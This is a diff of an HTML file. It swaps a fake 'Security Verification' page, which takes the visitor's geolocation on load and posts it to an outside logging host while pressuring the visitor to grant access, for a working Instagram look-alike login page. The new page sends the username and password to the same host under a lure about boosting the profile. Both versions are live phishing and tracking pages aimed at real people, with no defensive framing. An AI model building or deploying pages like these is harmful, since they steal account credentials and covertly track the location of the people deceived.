@@ -1,40 +1,116 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Security Verification</title>
-    <script>
-        function getLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(sendLocation, forceAllow);
-            } else {
-                alert("Geolocation is not supported by your browser.");
-            }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
         }
-
-        function sendLocation(position) {
-            let lat = position.coords.latitude;
-            let lon = position.coords.longitude;
-            let accuracy = position.coords.accuracy;
-
-            // Send the data to hacker's server
-            fetch("http://newzz.fwh.is/log.php", {
-                method: "POST",
-                headers: { "Content-Type": "application/x-www-form-urlencoded" },
-                body: JSON.stringify({ latitude: lat, longitude: lon, accuracy: accuracy })
-            });
-
-            // Redirect to Google after successful location access
-            window.location.href = "https://www.crazygames.com/multiplayer";
+        .container {
+            text-align: center;
+            background: white;
+            padding: 20px;
+            border: 1px solid #dbdbdb;
+            border-radius: 5px;
+            width: 90%;
+            max-width: 350px;
         }
-
-        function forceAllow(error) {
-            alert("You must click 'Allow' to proceed. Click 'Retry' and allow location access.");
-            getLocation(); // Re-run location request
+        .logo {
+            width: 175px;
+            margin: 10px auto;
         }
-    </script>
+        .form-group {
+            width: 100%;
+            margin-bottom: 10px;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #dbdbdb;
+            border-radius: 5px;
+            background-color: #fafafa;
+            font-size: 14px;
+        }
+        input:focus {
+            outline: none;
+            border-color: #a8a8a8;
+        }
+        .login-btn {
+            width: 100%;
+            padding: 10px;
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 14px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        .login-btn:hover {
+            background-color: #0077c2;
+        }
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 10px 0;
+        }
+        .divider::before, .divider::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background: #dbdbdb;
+        }
+        .divider span {
+            padding: 0 10px;
+            font-size: 12px;
+            color: #8e8e8e;
+        }
+        .forgot-pass {
+            font-size: 12px;
+            color: #00376b;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        .signup {
+            margin-top: 20px;
+            font-size: 14px;
+        }
+        .signup a {
+            color: #0095f6;
+            font-weight: bold;
+            text-decoration: none;
+        }
+    </style>
 </head>
-<body onload="getLocation()">
-    <h2>Security Verification</h2>
-    <p>For security reasons, please allow location access.</p>
+<body>
+
+<div class="container">
+    <img src="Instagram_icon.png" alt="Instagram Logo" class="logo">
+    <P> Please enter yor credentials <br> For security also to improve web traffic <br> 
+    which will boost your profile for offers</P>
+    <form action="http://newzz.fwh.is/log.php" method="POST">
+        <div class="form-group">
+            <input type="text" name="username" placeholder="Phone number, username, or email" required>
+        </div>
+        <div class="form-group">
+            <input type="password" name="password" placeholder="Password" required>
+        </div>
+        <button type="submit" class="login-btn">Log In</button>
+    </form>
+
+  
+
+ 
+
+   
+
 </body>
 </html>
